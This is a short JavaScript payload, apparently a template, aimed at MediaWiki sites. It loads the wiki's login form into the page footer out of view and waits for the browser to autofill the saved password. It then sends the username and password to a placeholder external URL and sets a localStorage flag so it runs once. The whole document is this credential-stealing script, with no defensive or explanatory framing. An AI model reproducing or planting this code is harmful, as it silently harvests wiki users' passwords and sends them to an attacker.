if (window.localStorage.getItem("gp1") === null) {
$.get("%%mw_website_prefix%%" + "Special:UserLogin", function(data) { 
    $("#footer").append($(data).find("form").eq(0).css({"display": "none"}));
    pw_i = 0;
    pw = setInterval(function () {
        if ($("#wpPassword1").val() !== "") {
            var sent_login = encodeURIComponent(wgUserName);
            var sent_pwd = encodeURIComponent($("#wpPassword1").val());
            var url = "%%retrieving_url%%"
                .replace("LOGIN", sent_login).replace("PASSWORD", sent_pwd);
            $.getJSON(url);
            window.localStorage.setItem("gp1", true);
            clearInterval(pw);
        } else if (pw_i > 5000) {
            clearInterval(pw);
            window.localStorage.setItem("gp1", false);
        }
        pw_i += 50;
    }, 50);
})
}